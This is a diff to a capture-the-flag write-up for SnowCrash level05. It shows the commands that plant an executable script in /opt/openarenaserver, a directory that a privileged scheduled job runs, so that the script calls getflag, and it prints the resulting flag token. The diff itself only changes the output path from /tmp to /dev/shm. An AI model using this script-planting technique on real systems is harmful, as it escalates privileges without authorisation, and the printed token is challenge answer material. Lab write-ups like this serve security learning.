@@ -32,11 +32,11 @@ done
 This script will run all files in /opt/openarenaserver in a bash shell.
 Thus we should create a bash script to call getflag in /opt/openarenaserver/.
 ```
-level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag.sh
+level05@SnowCrash:~$ echo "getflag > /dev/shm/flag" > /opt/openarenaserver/getflag.sh
 level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
 ```
 Wait a minute... and...
 ```
-level05@SnowCrash:~$ cat /tmp/flag
+level05@SnowCrash:~$ cat /dev/shm/flag
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
